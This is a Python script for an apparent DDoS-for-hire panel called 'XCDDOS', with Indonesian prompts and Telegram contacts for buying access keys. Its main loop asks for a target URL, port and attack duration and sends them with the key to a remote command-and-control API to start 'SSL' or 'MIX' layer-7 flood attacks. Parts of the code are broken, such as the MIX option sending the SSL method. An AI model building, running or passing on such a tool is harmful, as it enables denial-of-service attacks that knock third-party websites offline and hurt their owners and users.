# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[0;33m' #KUNING
P = '\033[0;94m' #BIRU
srv = requests.get(f"https://raw.githubusercontent.com/XinnChan/xinnclay.github.io/main/SERVER_XCDDOS.txt").json()

def XC():
	os.system ("clear")
	print(f"""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 


\033[37m[ XC ]
\033[0;33mUntuk Waktu sudah di sesuaiin sama Creater untuk menghindari Suspended Api Server agar server berjalan dengan sempurna kedepannya maka patuhi saja peraturannya!

                ⚠️Tolong Jangan Spam Method!⚠️
• Contohnya setelah penyerangan belum selesai di timpa method lagi
Ini akan menyebabkan Vps yang kalian pakai akan mengalami suspen karena sistem kami menggunakan fitur deteksi spam!
• Jika menggunakan termux maka Key akan di take down otomatis oleh sistem!
• Semisal penyerangan 300 detik maka tunggu waktu selesai baru bisa melakukan penyerangan ulang!
• Usahakan sebelum melakukan serangan ulang ketik STOP terlebih dahulu agar server dapat di refresh!

     ☢️ Server Online \033[0;94m{srv}
          ☢️ Concurent \033[0;94m1
\033[37m       ☢️ Version \033[0;94m1.0.0



\033[0;33mL7 XCDDOS [Ini Menggunakan C2 Api Server] 

\033[37m🔥 SSL

\033[37m🔥 MIX

""")

def KILL():
	os.system ("clear")
	print("""
                     __  ___              ____ _             
                     \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
                      \  /| | '_ \| '_ \| |   | |/ _` | | | |
                      /  \| | | | | | | | |___| | (_| | |_| |
                     /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                                       |___/ 
\033[32m                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⣠⠒⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠞⠋⠉⠀⠀⠀⠀ ⠀
                        ⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⣿⠂⠀⠀⠀⠀⣀⠄⡴⢈⣤⣎⠴⡏⠀⣀⠄⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⣿⠃⠀⠀⠀⡞⠀⣼⣽⣷⡿⡣⣾⣿⣶⣿⣶⡶⠖⠄⠂⠀⠀⠀ 
                        ⠀⠀⢠⠀⢸⣿⠀⠀⠀⢀⢹⣆⢀⣀⠀⣆⣾⣻⢞⡿⣺⣿⡿⠿⠛⠛⠻⢿⣿⣶⣄⠀⠀⠀ 
                        ⠀⠀⣯⠀⠘⣼⢢⣰⣇⣼⣾⣯⢹⢿⣶⣿⡿⣱⣿⡥⠃⣁⠤⣤⡤⡀⠀⠀⠈⣿⠏⠀⠀⠀ 
                        ⠀⠀⠸⣧⡀⣹⣬⢿⡟⢿⢿⠿⣿⢻⡅⣾⣾⣏⡎⡴⠊⣀⠀⢈⣿⣾⠂⠀⢰⠿⠀⠀⠀⠀ 
                        ⠀⠀⠀⠙⢿⣺⡜⢸⣿⣿⢘⡶⢵⣿⡿⣸⢿⣷⣞⣗⣺⣟⣿⠯⡶⠊⠀⣠⣣⠃⠀⠀⠀⠀ 
                        ⠀⠀⠀⠐⠦⢛⠿⣾⣿⣛⣾⣶⣿⢿⣿⡛⣯⣽⣻⣿⡟⢿⣳⠟⠁⢀⣞⡕⠁⠀⠀⠀⠀⠀ 
                        ⠀⠀⢠⠀⠀⡀⠳⣾⣿⣿⡿⣿⣷⣽⣯⣶⠾⢿⣿⣽⠼⠊⠀⢀⣴⡿⠽⠩⣇⣄⠀⠀⠀⠀ 
                        ⠀⠀⢠⣷⣸⣿⣇⡈⣿⣿⣿⣿⣿⣻⣞⣿⠟⠋⠉⠙⠀⢀⣴⢹⣿⣷⢿⣛⡏⠉⠀⠀⠀⠀ 
                        ⠀⠀⣾⣯⠛⠸⣞⣻⣯⢽⣴⣿⡟⣿⢹⡏⠀⢀⣤⠀⣴⣻⢿⣿⣿⡋⢤⠗⠀⠀⠀⠀⠀⠀ 
                        ⢀⡀⠘⣿⡷⠋⠀⠻⢼⣟⠟⠃⢹⣿⣿⠀⢸⡿⠃⣾⣿⣿⢸⢽⣿⠛⠉⠀⡀⣤⡤⠂⠀⠀ 
                        ⠸⣙⠤⡞⠀⠀⠀⡠⠔⠒⠂⢤⡘⠙⣻⠀⠘⣷⢰⢿⣟⣺⣟⣊⠉⢠⠤⣾⠞⡽⠧⢤⣀⡀ 
                        ⠀⡯⣦⠁⠀⠀⣾⠀⠀⠀⠀⠀⣈⣲⣾⠀⠀⠈⠺⡾⣍⣫⠙⡳⣷⣏⠞⠉⠁⠈⠑⡽⡆⠀ 
                        ⠀⠹⣦⡀⠀⠀⡿⣦⣄⣠⣴⠟⠉⠀⠈⡄⠀⠀⠀⠙⠮⣏⣙⠿⠓⠁⠀⠀⢀⣀⣀⣷⡇⠀ 
                        ⠀⠀⠙⣧⡀⠀⠘⠾⠾⠼⠋⠀⠀⠀⠀⣸⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠃⠀⠐⣱⠁⠀ 
                        ⠀⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⢿⡟⠢⠤⣀⣀⣀⣀⣤⣚⣶⠤⣤⡤⠚⠁⠀⠀ 
                        ⠀⠀⠀⠠⢔⣲⠿⠗⢲⣴⢶⣚⡩⠄⣱⡼⣮⡇⠀⠀⣀⠬⢻⢗⣟⣿⣵⠶⣳⠾⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠘⠢⠜⠋⢺⠏⠐⠪⠭⣙⣭⣟⡿⠷⣊⡱⢠⢾⡞⠚⠉⠛⠉⠁⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⣔⢓⣒⣉⠩⣭⣟⠋⣿⣏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣏⠋⡿⠚⠉⠉⠀ 
                                                       
\033[37m                        [STATUS] DDoS BERHASIL DI STOP!
\033[0;33m                            SERANGAN DDOS SELESAI!
\033[37m                        DAN TERMINAL BERHASIL DI REFRESH!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                USER     : \033[0;33m[ \033[032mXCDDOS \033[0;33m]
\033[0;94m                CREATOR  : \033[0;33m[ \033[032mXinnClay Fixxed \033[0;33m]
\033[0;94m                TELE     : \033[0;33m[ \033[32m@XinnClay_Fixxed \033[0;33m]
\033[0;94m                CHANNELS : \033[0;33m[ \033[32mhttps://t.me/XinnClayFixxed \033[0;33m]
\033[0;94m                YOUTUBE  : \033[0;33m[ \033[32mhttps://youtube.com/@xinnclay \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh XinnClay XCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
\033[1;36m
\033[37m                            ➲                   TYPE:
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                LS     : \033[0;33m[ \033[032mTO SEE ALL METHOD LIST \033[0;33m]
\033[0;94m                XC     : \033[0;33m[ \033[32mTO VIEW AND USE SPECIAL XCDDOS \033[0;33m]
╚════════════════════════════════════════════════════════╝
""")



def main():


	while True:
		sys.stdout.write(f"\x1b]2;[/] XCDDOS :: Server Online {srv} :: Running: {srv}/{srv}\x07")
		sin = input("\033[0;30;45mXCDDOS\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			XC()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			os.system ("pkill screen")
			KILL()
		if sinput == "back" or sinput == "BACK":
			os.system ("clear")
			XC()
		if sinput == "xc" or sinput == "XC":
			XC()
		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			XC()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			XC()
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			XC()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == "LS" or sinput == ".ls" or sinput == "ls" or sinput == ".LS" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			XC()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########L7 XC API########
		elif sinput == "ssl" or sinput == "SSL":
			try:
				url = input("Masukin Target Url nya Bro: ")
				port = input("Portnya Jangan lupa: ")
				time = input("Durasi Serangan Mau Berapa Detik?: ")
				key = input("Key nya masukin klo gada beli dulu di telegram https://t.me/XinnClay_Fixxed: ")
				xin = requests.get(f'{key}&url={url}&port={port}&time={time}&method=SSL').json
				os.system ("clear")
				print(f"""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
\033[0;33m ⚠️[INFO] DDoS Starting: {xin}⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mSSL\033[0;33m]
\033[0;94m                KEY      : \033[0;33m[ \033[32m{key}\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝

\033[0;33mSpecial method power C2 Pannel By XCDDOS
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "mix" or sinput == "MIX":
			try:
				url = input("Masukin Target Url nya Bro: ")
				port = input("Portnya Jangan lupa: ")
				time = input("Durasi Serangan Mau Berapa Detik?: ")
				key = input("Key nya masukin klo gada beli dulu di telegram https://t.me/XinnClay_Fixxed: ")
				xin = requests.get(f'{key}&url={url}&port={port}&time={time}&method=SSL').json
				os.system ("clear")
				print(f"""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
\033[0;33m ⚠️[INFO] DDoS Starting: {xin}⚠️

╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[\033[32m {url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[\033[32m {time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mMIX\033[0;33m]
\033[0;94m                KEY      : \033[0;33m[ \033[32m{key}\033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝

\033[0;33mSpecial method power C2 Pannel By XCDDOS
""")


			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = ""
    passwd = ""
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO XCDDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""☠️ \033[1;31;40mPW SALAH BELI DULU !!!🚫\nTELEGRAM: @XinnClay_Fixxed""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO XCDDOS TOOLS""")
        time.sleep(0.3)
    XC()
    main()
    

login()